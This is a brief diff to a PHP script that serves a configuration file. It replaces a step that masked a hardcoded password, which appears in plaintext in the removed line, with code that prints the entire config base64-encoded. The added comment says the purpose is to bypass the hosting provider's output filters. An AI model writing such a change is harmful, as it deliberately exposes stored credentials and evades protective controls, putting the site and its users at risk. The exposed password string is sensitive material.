@@ -10,8 +10,6 @@ if (!file_exists($path)) {
 
 $content = file_get_contents($path);
 
-// Safe mask using string replacement
-$obscured = str_replace('ZuvioGlobalSchool@1234#', '******', $content);
-
-echo $obscured;
+// Output base64 encoded config to bypass hosting output filters
+echo base64_encode($content);
 exit;
